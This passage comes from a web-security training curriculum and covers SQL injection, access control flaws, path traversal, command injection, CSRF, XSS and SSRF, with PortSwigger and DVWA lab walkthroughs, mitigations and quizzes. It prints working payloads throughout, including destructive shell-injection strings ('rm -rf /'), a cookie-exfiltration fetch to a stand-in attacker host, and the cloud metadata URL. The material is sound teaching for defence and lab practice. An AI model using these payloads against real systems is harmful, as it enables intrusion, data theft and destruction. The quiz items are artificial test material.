' IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '00:00:05' --
'
```

**Resources:**

- [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection) _(link)_
- [sqlmap](https://github.com/sqlmapproject/sqlmap) _(tool)_
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) _(link)_

**Quick Quiz:**

1. Which payload is a classic authentication-bypass technique appended to a login form's password field?
   - **' OR 1=1 --** ✓
   - {{7*7}}
   - <script>alert(1)</script>
   - ../../../etc/passwd
   > ' OR 1=1 -- closes the string literal, adds an always-true condition, then comments out the rest of the query, bypassing the WHERE clause check.
2. Before a UNION-based payload like ' UNION SELECT null, username, password FROM users-- will work, what must the attacker determine?
   - The database server's hostname
   - **The number of columns returned by the original query** ✓
   - The web server's operating system
   - The victim's session cookie value
   > UNION SELECT requires the injected query to return the same number of columns as the original query, so column count must be established first.
3. In Blind SQL injection, how is data typically extracted when there is no visible query output in the response?
   - **By reading response differences to true/false conditions or timing delays** ✓
   - By reading the HTTP response headers only
   - By directly viewing the database file
   - By using CSRF tokens
   > Blind SQLi has no direct data output, so attackers infer data character-by-character from boolean response differences or time-based delays.

#### 112. Broken Access Control - IDOR, Forced Browsing, Privilege Escalation `[theory]` — Week 9

Broken access control happens when an app checks that you're logged in but not that you're allowed to do the specific thing you're asking for — and OWASP's own data shows it in 94% of tested applications, at an average incidence rate of 3.81%, making it the single most prevalent class in this curriculum. Vertical privilege escalation looks like a check such as if ($user->role == 'admin') that trusts a client-controllable role field instead of a server-verified one; horizontal privilege escalation looks like a route that fetches a user profile by id with no ownership check at all, so requesting another user's id returns their data. The PortSwigger IDOR lab makes this concrete: the live-chat 'View transcript' feature requests GET /download-transcript/2.txt, and simply requesting /download-transcript/1.txt instead returns another user's (Carlos's) transcript — which contains his password in plaintext, letting you log in as him. A second lab shows the 'unprotected functionality' variant: appending /robots.txt to the lab's base URL discloses a Disallow: /administrator-panel entry for a hidden admin page that was never actually access-controlled, just unlinked — navigating there directly and deleting the user Carlos solves the lab. Finding these bugs starts with a simple methodology: identify the primary key or unique identifier the application uses for a user or resource — some systems use unpredictable random IDs such as UUIDv4, others use easily-incremented numerical IDs, and it's the latter (like /api/user/profile/123) that makes horizontal escalation as simple as requesting /api/user/profile/124. Real-world instances of vertical escalation recur in predictable places: a school website where a student reaches the grade-changing feature meant only for teachers, or a CMS where editor/author/administrator roles exist but improper access controls let a lower-privileged role reach functions reserved for a higher one. Underneath most of these bugs sits one of a handful of concrete misconfigurations — missing authorization checks on critical endpoints, inadequate permission validation, incomplete access control matrices, or access controls implemented client-side only rather than enforced on the server — which is why detection leans on both systematic auditing (regular assessments, penetration testing, access-control config review) and comprehensive monitoring (detailed logging, anomaly detection, alerting, and audit trails), and why prevention points to formal frameworks like role-based access control (RBAC) and, where needed, attribute-based access control (ABAC), on top of least privilege.

**Key Points:**

- Vertical privilege escalation pattern: if ($user->role == 'admin') trusting a client-manipulable $user->role field instead of a server-verified session claim
- Horizontal privilege escalation pattern: a route returning another user's data with no check that the requester owns that id — e.g. GET /user/1234 leaking anyone's profile
- Real IDOR lab: chat transcript endpoint GET /download-transcript/2.txt; changing the number to /download-transcript/1.txt retrieves another user's (Carlos's) transcript containing his plaintext password
- Real unprotected-admin-functionality lab: GET /robots.txt discloses Disallow: /administrator-panel — an admin path that was hidden, not actually authenticated — reachable and exploitable (delete user Carlos) without ever logging in as admin
- Prevalence: broken access control appeared in 94% of applications tested, average incidence rate 3.81% (the highest-prevalence weakness class covered in this module)
- Simple IDOR pattern: www.shop.com/receipt/12345 -> attacker tries www.shop.com/receipt/12346 if the server doesn't verify the requester owns that receipt
- Related CWEs: CWE-200 (exposure of sensitive info to an unauthorized actor), CWE-201 (insertion of sensitive info into sent data), CWE-352 (CSRF)
- Mitigation: use unpredictable indirect references instead of sequential IDs/filenames, enforce server-side ownership checks at every access point, never rely on an unlinked URL as a security boundary
- Practical starting point for finding IDOR: first identify the primary key or unique identifier the app uses for users/resources — some systems use unpredictable random IDs (e.g. UUIDv4), others use easily-incremented numerical IDs; the latter is what makes an endpoint like /api/user/profile/123 exploitable by simply requesting /api/user/profile/124
- Real-world vertical-escalation example: a school website where students should only view their own grades and teachers can view and change all grades — vertical escalation is a student reaching the grade-changing feature meant only for teachers
- Real-world vertical-escalation example: a CMS with editor/author/administrator roles, where improper access controls let a lower-privileged role reach functions reserved for a higher one
- Common misconfigurations behind broken access control: missing authorization checks on critical endpoints, inadequate validation of user permissions, incomplete access control matrices, misconfigured security settings, and access controls implemented client-side only rather than enforced server-side
- Detection relies on two tracks: systematic security auditing (regular assessments, penetration testing, reviewing access-control configurations) and comprehensive monitoring (detailed logging, watching for anomalous access patterns, alerting on suspicious activity, maintaining audit trails of critical operations)
- Prevention frameworks named in the source material: role-based access control (RBAC) and, where needed, attribute-based access control (ABAC), alongside enforcing the principle of least privilege
- Additional mitigation practice: log all access attempts and monitor for suspicious patterns of behavior, on top of using unpredictable indirect references and server-side ownership checks

```bash
GET /download-transcript/2.txt
GET /download-transcript/1.txt
GET /robots.txt
www.shop.com/receipt/12346
```

**Resources:**

- [PortSwigger: Access control vulnerabilities](https://portswigger.net/web-security/access-control) _(link)_
- [OWASP Top 10:2021 A01 Broken Access Control](https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/) _(link)_
- [HackTricks](https://book.hacktricks.xyz) _(link)_

**Quick Quiz:**

1. A user changes /receipt/12345 to /receipt/12346 in the URL and views another customer's receipt. What is this called?
   - CSRF
   - **IDOR** ✓
   - SSTI
   - Reflected XSS
   > IDOR (Insecure Direct Object Reference) occurs when a predictable object reference is exposed without proper authorization validation.
2. Reaching a hidden admin panel by directly navigating to its path after finding a hint in robots.txt is an example of:
   - **Forced browsing** ✓
   - SSRF
   - SQL injection
   - A business logic flaw
   > Forced browsing means directly navigating to a page that isn't linked in the UI but is still reachable if you know or guess the path.
3. A normal authenticated user manages to reach an admin-only function. What type of privilege escalation is this?
   - Horizontal
   - **Vertical** ✓
   - Lateral
   - Blind
   > Vertical privilege escalation means moving from a lower-privileged role to a higher-privileged one; horizontal is accessing another same-level user's data.

#### 113. Path Traversal / Directory Traversal `[theory]` — Week 9

Path traversal exploits a file path built directly from unvalidated user input, letting an attacker walk out of the intended directory with ../ sequences. The vulnerable pattern is a one-liner — $path = "/var/www/html/uploads/" . $_GET['file']; readfile($path); — and the PortSwigger lab exploits exactly this: the image endpoint /image?filename=10.jpg is intercepted in Burp Repeater and the filename parameter is changed to ../../../etc/passwd (adding ../ segments until the right directory depth is reached), returning the contents of the server's /etc/passwd file in the response. The same class of bug appears generically as http://example.com/download.php?file=../../../../etc/passwd — a classic payload against any endpoint that concatenates user input onto a base path without validation. A related example in the source material uses a slightly deeper path — http://example.com/view.php?file=../../../../../etc/passwd — walking back five directory levels from a base like /uploads/ to reach the filesystem root. Beyond reading /etc/passwd, the same flaw can expose configuration files, credentials, or source code, any of which can feed into further compromise; and the damage isn't limited to reading files either — where write access is reachable, the same flaw lets an attacker modify or delete critical files, compromising system integrity and availability on top of confidentiality.

**Key Points:**

- Vulnerable pattern: $path = "/var/www/html/uploads/" . $_GET['file']; readfile($path); — unsafe string concatenation with no validation
- Real PortSwigger lab: image endpoint /image?filename=10.jpg; modifying filename to ../../../etc/passwd in Burp Repeater (increasing ../ depth until correct) returns /etc/passwd's contents
- Generic classic payload: http://example.com/download.php?file=../../../../etc/passwd
- Impact: exposes sensitive files (config files, password files, source code) that can enable further privilege escalation
- Mitigation: whitelist valid filenames/patterns, normalize/canonicalize the resolved path, and restrict it to a fixed base directory before any file operation
- Mitigation: apply least-privilege file permissions so even a successful traversal can't reach files the app process shouldn't be able to read
- A second exact traversal example from the source material: from a base path like /uploads/, five ../ segments — http://example.com/view.php?file=../../../../../etc/passwd — are enough to traverse back to the filesystem root and read /etc/passwd
- Beyond reading files, the source material also flags a write/delete impact: attackers may modify or delete critical files via the same traversal flaw, compromising system integrity and application availability, not just confidentiality

```bash
http://example.com/download.php?file=../../../../etc/passwd
../../../etc/passwd
/image?filename=../../../etc/passwd
http://example.com/view.php?file=../../../../../etc/passwd
```

**Resources:**

- [PortSwigger: Path traversal](https://portswigger.net/web-security/file-path-traversal) _(link)_
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html) _(link)_
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) _(link)_

**Quick Quiz:**

1. Which of these values, submitted to a vulnerable 'file' parameter, demonstrates a path traversal attack?
   - **../../../../etc/passwd** ✓
   - ' OR 1=1 --
   - <script>alert(1)</script>
   - {{7*7}}
   > The repeated ../ sequences walk up out of the intended directory to reach an absolute path like /etc/passwd, the classic traversal payload.
2. Given the vulnerable pattern readfile('/var/www/html/uploads/' . $_GET['file']), which mitigation is most effective?
   - Blacklisting the string "../"
   - **Canonicalising the path and restricting it to a fixed base directory** ✓
   - Renaming the uploads folder
   - Adding a CAPTCHA to the download page
   > Blacklisting specific strings is easily bypassed with encoding or nesting tricks; canonicalising the resolved path and enforcing it stays within an allowed base directory is the robust fix.
3. Path traversal is also commonly known as:
   - **Directory traversal** ✓
   - Cross-site scripting
   - Business logic bypass
   - Mass assignment
   > "Path traversal" and "directory traversal" are used interchangeably to describe the same class of vulnerability.

#### 114. Command Injection (OS injection, ; && | operators) `[theory]` — Week 9

Command injection happens when unsanitized input reaches a system shell, and the source material shows it across a systems-level, a web, and a scripting example. The C snippet snprintf(command, sizeof(command), "ls %s", argv[1]); system(command); lets an attacker run ./program "myfile.txt; rm -rf /" and execute rm -rf / alongside the intended ls; the PHP equivalent, $command = "cat " . $filename; system($command);, lets a URL like ?file=important.txt; ls -la chain in a directory listing; and a Python example, import os; user_input = input("Enter filename: "); os.system(f"cat {user_input}"), lets the same filename.txt; rm -rf / input run both the intended cat and the injected rm -rf /. The PortSwigger stock-checker lab demonstrates the same flaw live: intercepting the 'Check stock' request in Burp and changing the storeID parameter — the full injected line is productID = 1 & storeID=1 | whoami — pipes the output of the intended command into whoami, and the response reveals the web server's running user, proof of full command execution. The chaining operators matter here: ; runs commands sequentially regardless of outcome, && only runs the second if the first succeeds, || only runs it if the first fails, | pipes one command's output into the next, and redirecting input/output with >, >>, or < is called out as its own separate shell-injection technique.

**Key Points:**

- Vulnerable C pattern: snprintf(command, sizeof(command), "ls %s", argv[1]); system(command); — running ./program "myfile.txt; rm -rf /" executes both ls myfile.txt and rm -rf /
- Vulnerable PHP pattern: $command = "cat " . $filename; system($command); — a request to ?file=important.txt; ls -la runs both cat and ls -la
- Real lab: stock-checker's storeID parameter changed to 1|whoami via Burp Repeater; the response reveals the web server's actual running user
- Chaining operators: ; sequential regardless of result, && only if the prior command succeeded, || only if it failed, | pipes output into the next command
- Impact per source: remote code execution, data breaches, system integrity compromise (file tampering, malware install), denial of service via resource exhaustion
- Mitigation: whitelist input validation, escape shell metacharacters, prefer safe built-in APIs (e.g. os.path.exists()) over shelling out at all
- Mitigation: run the vulnerable process with least privilege so a successful injection has limited blast radius
- A third vulnerable pattern from the source material, in Python: import os; user_input = input("Enter filename: "); os.system(f"cat {user_input}") — entering filename.txt; rm -rf / runs both the intended cat filename.txt and the injected rm -rf /
- A fourth chaining technique beyond ;, &&, ||, and |: redirecting input/output with >, >>, or < as its own shell-injection technique
- The stock-checker lab's exact injected parameter line: productID = 1 & storeID=1 | whoami — piping the preceding command's output into whoami to reveal the web server's running user

```bash
filename.txt; rm -rf /
1|whoami
./program "myfile.txt; rm -rf /"
?file=important.txt; ls -la
os.system(f"cat {user_input}")
productID = 1 & storeID=1 | whoami
```

**Resources:**

- [PortSwigger: OS command injection](https://portswigger.net/web-security/os-command-injection) _(link)_
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) _(link)_
- [GTFOBins](https://gtfobins.github.io/) _(tool)_

**Quick Quiz:**

1. Given os.system(f"cat {user_input}"), which submitted value would reveal the identity of the user running the web server process?
   - filename.txt
   - **filename.txt; whoami** ✓
   - ' OR 1=1 --
   - {{7*7}}
   > The ; operator sequentially chains a second command (whoami) onto the original cat command, executing it with the same privileges as the server process.
2. Which shell operator only runs the second command if the first command fails?
   - ;
   - &&
   - **||** ✓
   - |
   > || is a logical OR — the second command executes only if the preceding command returns a non-zero (failure) exit code.
3. In the payload 1|whoami against a stock-checker parameter, what is the role of the | operator?
   - It sequences the two commands regardless of success or failure, same as ;
   - **It pipes the first command's output into whoami, and whoami's own output ultimately reaches the response** ✓
   - It only executes whoami if the stock-check command fails
   - It escapes the whoami command so it is treated as literal text
   > | chains the attacker's own command (whoami) into the pipeline so its output is what gets returned in the response, confirming command injection.

#### 115. CSRF (Cross-Site Request Forgery) `[theory]` — Week 9

CSRF abuses the fact that browsers automatically attach a logged-in user's cookies to any request, even ones triggered by a different site — so a hidden auto-submitting form fires as the victim the moment they load a malicious page. The source lab goes a step further into a real bypass: the target app validated its CSRF token only on POST requests, so after confirming a tampered token gets a POST rejected, right-clicking the request in Burp Repeater and using 'Change request method' to convert it to GET caused the same action to succeed with no token check at all. From there, the exploit is built and hosted on Burp's exploit server — a minimal HTML form pointing at the vulnerable change-email endpoint — and fired at a victim session via 'Deliver to victim' to change their email without their consent.

**Key Points:**

- Root cause: browsers auto-attach session cookies to any request regardless of which site triggered it, so a hidden cross-origin form executes with the victim's authentication
- Real bypass technique: the app validated the CSRF token only for POST requests; converting the same request to GET in Burp Repeater ('Change request method') skipped token validation entirely
- Exploit construction: <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="anything%40web-security-academy.net"></form><script>document.forms[0].submit()</script>, hosted on an exploit server and fired via 'Deliver to victim'
- Basic auto-submit CSRF pattern: hidden form plus document.forms[0].submit() inside a <script> tag, requiring no user interaction beyond loading the page
- Mitigation: anti-CSRF tokens tied to the session and validated on every state-changing request regardless of HTTP method, SameSite cookies, Referer-header validation, re-authentication for sensitive actions
- Related CWE: CWE-352 (Cross-Site Request Forgery)

```bash
<form action="https://example.com/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
</form><script>document.forms[0].submit()</script>
GET /my-account/change-email?email=attacker@evil.com  (token skipped after changing POST to GET)
```

**Resources:**

- [PortSwigger: CSRF](https://portswigger.net/web-security/csrf) _(link)_
- [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) _(link)_
- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html) _(link)_

**Quick Quiz:**

1. Why does the auto-submitting hidden form in the CSRF proof-of-concept succeed without the victim entering credentials?
   - It steals the victim's password via a keylogger
   - **The browser automatically attaches the victim's existing session cookies to the forged request** ✓
   - It exploits a SQL injection in the login form
   - It requires the victim to type their password into the malicious page
   > CSRF relies on the browser automatically including cookies on any request to the target domain, so the forged request rides on the victim's already-authenticated session.
2. Which of the following is the standard CSRF mitigation that ties a unique value to the user's session and validates it server-side?
   - Rate limiting
   - **Anti-CSRF tokens** ✓
   - Password complexity rules
   - TLS certificate pinning
   > A unique, unpredictable anti-CSRF token embedded in each state-changing form and validated server-side ensures the request truly originated from the legitimate application.
3. Which cookie attribute, when set appropriately, helps prevent a cookie from being sent along with cross-site requests?
   - HttpOnly
   - Secure
   - **SameSite** ✓
   - Max-Age
   > The SameSite cookie attribute (Lax or Strict) instructs the browser not to send the cookie on cross-site requests, directly mitigating CSRF.

#### 116. PortSwigger: XSS Labs - 3 labs (Reflected, Stored, DOM) `[lab]` — Week 9

Hands-on replication of the three PortSwigger XSS labs referenced in the theory topic: confirm each vulnerable sink first, then craft the exact breakout payload it requires.

**Key Points:**

- Reflected: confirm <h1>Hello world</h1> renders unencoded via page Inspect, then submit <script>alert(1)</script> in the search box to trigger the lab's alert
- Stored: submit <script>alert(document.cookie)</script> as a blog comment; reload the post to confirm it fires for every visitor, not just the poster
- DOM-based: the vulnerable sink is document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">') fed straight from location.search — pass "><img src=x onerror=alert('XSS_doomed')> via ?search= to break out of the src attribute and fire the onerror handler
- Real-world payload worth knowing beyond alert(): fetch('https://attacker-site.com/steal?cookies=' + document.cookie) for actual cookie exfiltration

```bash
<script>alert(1)</script>
<script>alert(document.cookie)</script>
"><img src=x onerror=alert('XSS_doomed')>
```

**Resources:**

- [PortSwigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) _(link)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) _(link)_

**Quick Quiz:**

1. In the DOM-based XSS lab, what must you identify before crafting a working payload?
   - The database schema
   - **The vulnerable source and sink pair (e.g. location.search feeding into document.write)** ✓
   - The server's TLS certificate
   - The CSRF token value
   > DOM XSS lives entirely client-side, so the exploit path depends on which untrusted source flows into which dangerous sink.
2. For the reflected XSS lab, which payload proves basic script execution in the search field?
   - ' OR 1=1 --
   - **<script>alert(1)</script>** ✓
   - ../../../etc/passwd
   - {{7*7}}
   > A simple <script>alert(1)</script> in a reflected parameter is the standard first proof-of-concept for confirming unsanitised script execution.
3. Why does the stored XSS lab use alert(document.cookie) rather than just alert(1)?
   - **To demonstrate the payload could exfiltrate a victim's session cookie, showing real impact** ✓
   - Because alert(1) doesn't work in stored contexts
   - Because cookies are required to submit the comment
   - To bypass a WAF
   > Showing document.cookie in the alert demonstrates the payload can access sensitive session data, illustrating real-world impact beyond a simple proof-of-concept.

#### 117. PortSwigger: SQL Injection Labs - 3 labs (UNION, blind, error-based) `[lab]` — Week 9

Hands-on replication of the WHERE-clause, UNION, and Blind SQL injection labs from the theory topic, each solved with Burp Suite Repeater and Intruder against a real vulnerable target.

**Key Points:**

- WHERE-clause lab: category=Gifts' OR 1=1-- (URL-encoded with Ctrl+U in Burp Repeater) turns WHERE category='Gifts' AND released=1 into an always-true condition, exposing unreleased products
- UNION lab: send '+UNION+SELECT+NULL--, then add NULLs one at a time (NULL,NULL--, NULL,NULL,NULL--...) until the column-count error disappears, then swap in username, password to dump credentials
- Blind lab: confirm the injection with TrackingId=xyz' AND '1'='1 vs '1'='2, confirm the table/user with (SELECT 'a' FROM users WHERE username='administrator')='a, then use Burp Intruder with a Grep-Match on 'Welcome back' to brute-force SUBSTRING(password,N,1) one character at a time
- Optional automation: a small Python script (requests + a character-code loop over 32-126 per position) can extract the same password far faster than manual Intruder runs

```bash
Gifts' OR 1=1 --
'+UNION+SELECT+NULL--
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

**Resources:**

- [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection) _(link)_
- [sqlmap](https://github.com/sqlmapproject/sqlmap) _(tool)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_

**Quick Quiz:**

1. In the WHERE-clause lab, which Burp tool is used to send and modify the category filter request?
   - Intruder
   - **Repeater** ✓
   - Sequencer
   - Decoder
   > Repeater is used to manually modify and resend a single request repeatedly while testing injection payloads.
2. When extracting the blind SQLi admin password character-by-character with Intruder, what confirms a correct character guess?
   - **A Grep-Match hit on a string only present when the condition is true** ✓
   - An HTTP 500 error
   - A redirect to the login page
   - A change in response content-length only for failed guesses
   > Grep-Match flags responses containing a marker string that only appears when the injected boolean condition evaluates true, automating detection across many requests.
3. What determines when a UNION-based injection is ready to actually extract data?
   - **Once the number of NULL columns in UNION SELECT matches the original query's column count** ✓
   - Once you find the admin's password hash
   - Once the WAF is disabled
   - Once you know the server's IP address
   > A UNION SELECT must return exactly as many columns as the original query for the database to accept it; only then can real column values replace the NULLs.

#### 118. PortSwigger: Broken Access Control - 2 labs (IDOR, privilege escalation) `[lab]` — Week 9

Hands-on replication of the IDOR and unprotected-admin-functionality labs: one shows access control missing on a direct object reference, the other shows it missing on an entire hidden endpoint.

**Key Points:**

- IDOR lab: the live chat's 'View transcript' feature requests GET /download-transcript/2.txt; changing it to /download-transcript/1.txt retrieves another user's (Carlos's) transcript, which contains his plaintext password
- Forced-browsing lab: GET /robots.txt on the lab's base URL discloses a Disallow: /administrator-panel entry for an admin page that was hidden but never actually access-controlled; navigate there directly and delete the user Carlos to solve it
- Both labs share the same root cause: the server trusts a client-supplied identifier or path instead of verifying the requesting session is actually authorized for that resource

**Resources:**

- [PortSwigger: Access control vulnerabilities](https://portswigger.net/web-security/access-control) _(link)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_

**Quick Quiz:**

1. In the IDOR lab, changing /download-transcript/2.txt to /download-transcript/1.txt accomplishes what?
   - Deletes another user's data
   - **Retrieves another user's chat transcript without authorization** ✓
   - Escalates to admin privileges directly
   - Triggers a CSRF attack
   > Simply changing the numeric ID in the URL retrieves a different user's transcript, since the endpoint doesn't validate that the requester owns that transcript.
2. What technique reveals the hidden admin panel path in the forced-browsing lab?
   - SQL injection into the login form
   - **Checking /robots.txt for a Disallow entry** ✓
   - Brute-forcing the admin password
   - Reading the page's HTML comments
   > robots.txt is meant to tell search-engine crawlers what not to index, but it often inadvertently reveals hidden paths like an admin panel to an attacker.
3. What must be done after reaching the hidden admin panel to fully solve the lab?
   - Simply viewing the panel is enough
   - **Perform the required privileged action, e.g. deleting a user** ✓
   - Log out immediately
   - Report it to PortSwigger support
   > The lab isn't marked solved until the actual privileged action available only to admins is carried out.

#### 119. DVWA: Complete SQLi & XSS all difficulty levels `[lab]` — Week 9

Exploit both SQL Injection and XSS (Reflected & Stored) across all four DVWA difficulty settings (Low/Medium/High/Impossible), observing how each level's mitigations change the required technique.

**Key Points:**

- Low: little to no filtering — direct payloads work as-is
- Medium/High: partial filtering/encoding — requires payload variation or case/encoding tricks to bypass
- Impossible: proper parameterised queries/output encoding — confirm the vulnerability is no longer exploitable

**Resources:**

- [DVWA](https://github.com/digininja/DVWA) _(tool)_
- [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection) _(link)_
- [PortSwigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) _(link)_

**Quick Quiz:**

1. At DVWA's 'Low' security setting, why do unmodified classic payloads typically work?
   - The server blocks all requests
   - **Little to no input filtering/encoding is applied** ✓
   - The database doesn't exist at Low
   - JavaScript is disabled at Low
   > DVWA's Low setting intentionally applies minimal or no sanitisation, so textbook payloads succeed without any bypass technique.
2. At 'Medium' or 'High' DVWA settings, what typically must an attacker do differently compared to Low?
   - Nothing, the same payload always works
   - **Vary or encode the payload to bypass partial filtering (e.g. case variation, stripped tags)** ✓
   - Switch to a completely different vulnerability class
   - Use only GET requests
   > Medium/High apply partial filtering such as stripping 'script' tags, so the payload needs adaptation like case-mixing or alternate encoding to still succeed.
3. At the 'Impossible' DVWA setting, what should the attacker confirm?
   - **That the vulnerability is now properly mitigated and no longer exploitable** ✓
   - That the vulnerability is still exploitable with more effort
   - That the server has crashed
   - That a new vulnerability has appeared
   > 'Impossible' mode implements correct security controls like parameterised queries and proper output encoding, so the exercise confirms defenses actually work.


---

## M10: OWASP Top 10 - Web Attacks Part 2

**Month 3** · Week 10 · 14 topics

The second, more advanced half of the web-exploitation curriculum: SSRF, file inclusion, SSTI, file upload attacks, business logic flaws, information disclosure, cryptographic failures, API-specific vulnerabilities, and the emerging LLM/AI attack surface.

**Learning Outcomes:**

- Exploit basic SSRF to reach internal-only resources
- Exploit LFI/RFI to read arbitrary files or achieve RCE
- Identify and exploit Server-Side Template Injection
- Bypass file-upload restrictions to achieve a web shell
- Recognise business-logic flaws, information disclosure, and API-specific vulnerability classes

**Module Resources:**

- [PortSwigger Web Academy](https://portswigger.net/web-security) _(platform)_
- [HackTricks](https://book.hacktricks.xyz) _(link)_
- [OWASP API Security Top 10](https://owasp.org/API-Security/) _(link)_
- [OWASP GenAI Security Project: Top 10 for LLM & GenAI](https://genai.owasp.org/llm-top-10/) _(link)_

**Module Quiz (10 questions):**

1. Both SSRF against cloud metadata endpoints and RFI ultimately rely on what shared weakness in server behaviour?
   - **The server making outbound/inclusion requests to attacker-influenced destinations without validating them** ✓
   - Weak TLS cipher suites
   - Missing CSRF tokens
   - SQL syntax errors
   > Both SSRF and RFI stem from the server trusting user-supplied URLs or paths to reach or include content without validating the destination.
2. Which payload/technique pairing is correctly matched?
   - **{{7*7}} rendering as 49 — confirms SSTI** ✓
   - http://169.254.169.254/latest/meta-data/ — confirms stored XSS
   - exploit.pHp — confirms SSRF
   - { "role": "admin" } — confirms path traversal
   > {{7*7}} evaluating to 49 is the standard SSTI confirmation technique; the other pairings mismatch payload with vulnerability class.
3. Why is mass assignment considered an API-specific evolution of a broader vulnerability concept covered in this module?
   - It's unrelated to any other vulnerability covered here
   - **It generalises the idea of trusting client-supplied data unconditionally, similar in spirit to trusting a client-supplied price in a business logic flaw** ✓
   - It only affects GraphQL
   - It requires SSRF first
   > Both mass assignment and price manipulation share the same root weakness: the server accepts client-supplied values for fields it should independently control or validate.
4. Which combination of a mitigation and the vulnerability it addresses is correct?
   - **Allowlisting destination IPs/URLs — SSRF** ✓
   - Anti-CSRF tokens — Cryptographic failures
   - bcrypt/Argon2 — Business logic vulnerabilities
   - Canonicalising paths — Mass assignment
   > Allowlisting valid destination URLs/IPs and blocking private ranges is the standard SSRF mitigation; the other pairings mismatch mitigation with vulnerability class.
5. A pentester finds an exposed backup file containing a hardcoded database encryption key. Which two OWASP categories from this module does this single finding touch?
   - **Information disclosure and cryptographic failures** ✓
   - SSRF and business logic
   - BOLA and SSTI
   - File upload and LLM prompt injection
   > The exposed backup file is itself an information disclosure issue, while the hardcoded key inside it is a cryptographic failure — the single finding spans both categories.
6. Why does modern PHP configuration make classic RFI less common than it used to be?
   - **allow_url_fopen, needed for remote includes, is increasingly disabled by default** ✓
   - PHP no longer supports the include() function
   - RFI was replaced entirely by SSTI
   - Modern web servers block all outbound requests
   > RFI depends on settings like allow_url_fopen that let include()/require() fetch remote URLs; secure-by-default configurations increasingly disable this.
7. An LLM-integrated support tool executes a destructive database action based on a user's plain-English request. Which pairing correctly describes the root cause and the correct mitigation?
   - **Excessive agency (root cause) and enforcing authorization independent of the model (mitigation)** ✓
   - SSTI (root cause) and canonicalising paths (mitigation)
   - Mass assignment (root cause) and bcrypt (mitigation)
   - CSRF (root cause) and SameSite cookies (mitigation)
   > The root cause is excessive agency, and the correct mitigation is enforcing authorization on the API itself, never trusting the model's judgement as the security boundary.
8. Business logic vulnerabilities are described as difficult for automated scanners to find. What property do BOLA and mass assignment share that also makes them hard to catch with generic scanning?
   - **They both require understanding the application's intended data model or ownership rules, not just a syntactic payload pattern** ✓
   - They are both cryptographic in nature
   - They both require a buffer overflow first
   - They only occur over UDP
   > Like business logic flaws, BOLA and mass assignment require understanding what a field or object reference is supposed to mean, context a scanner can't infer from syntax alone.
9. A file upload feature accepts a file whose Content-Type header says image/jpeg but whose actual bytes are a PHP script. Which principle would have prevented this if properly implemented?
   - **Validating actual file content/magic bytes rather than trusting a client-supplied header** ✓
   - Requiring HTTPS for the upload
   - Increasing the maximum file size limit
   - Adding a CAPTCHA to the upload form
   > The Content-Type header is entirely client-controlled and trivially spoofed; robust validation inspects the file's actual content rather than a claimed MIME type.
10. Which statement best synthesises the common thread across SSRF, LFI/RFI, and SSTI as covered in this module?
   - **All three ultimately let attacker-influenced input control a server-side operation (a request, an include, or a template evaluation) meant to be safe, escalating from data exposure toward code execution** ✓
   - All three exclusively target client-side JavaScript
   - All three require a valid admin session first
   - All three are only exploitable over UDP
   > SSRF hijacks an outbound request, LFI/RFI hijacks a file include, and SSTI hijacks template evaluation — all three let untrusted input steer a server-side mechanism, often escalating to code execution.

### Topics

#### 120. SSRF - Server-Side Request Forgery (basics, blind SSRF, AWS metadata) `[theory]` — Week 10

SSRF tricks the server itself into making requests to internal or unintended resources on the attacker's behalf — the server acts as your personal proxy into its own private network. As the source material puts it: like a hotel guest who, instead of asking the receptionist to call a friend, sneakily tells them to dial the hotel manager's private line — the receptionist doesn't realize the difference and makes the call anyway. This matters because back-end systems reachable only from the server (non-routable private IPs, cloud metadata services, internal admin panels) are usually protected purely by network topology rather than real authentication, so once a public-facing feature can be tricked into fetching an arbitrary URL, that entire trust boundary collapses.

**Key Points:**

- Against the server itself: point a fetch parameter at 127.0.0.1/localhost to reach internal-only endpoints via the loopback interface
- Against other back-end systems: reach non-routable internal IPs that are normally protected only by network topology and have a weaker security posture as a result
- Real-world pattern: a PDF-generation feature that fetches a user-supplied URL server-side can be pointed at http://localhost:8000/admin — the server blindly embeds the fetched internal admin content into the generated PDF, which the attacker then downloads
- PortSwigger lab technique: intercept the 'check stock' request, find the stockApi parameter holding a full URL, and replace it with http://localhost/admin to reach the internal admin interface, then http://localhost/admin/delete?username=carlos to delete a user directly through the exposed endpoint
- Cloud/AWS metadata: fetching http://169.254.169.254/latest/meta-data/ can leak instance credentials and internal secrets
- Beyond data exposure, SSRF enables pivoting further attacks from inside the network and denial of service by flooding internal services via the trusted server
- Mitigations: allowlist destination URLs/IPs, block private IP ranges, enforce expected URL schemes, isolate internal services behind their own auth, disable unnecessary URL-fetching features, and firewall the server's own outbound access to sensitive internal services

```bash
http://localhost/admin
http://localhost/admin/delete?username=carlos
http://169.254.169.254/latest/meta-data/
```

**Resources:**

- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf) _(link)_
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) _(link)_
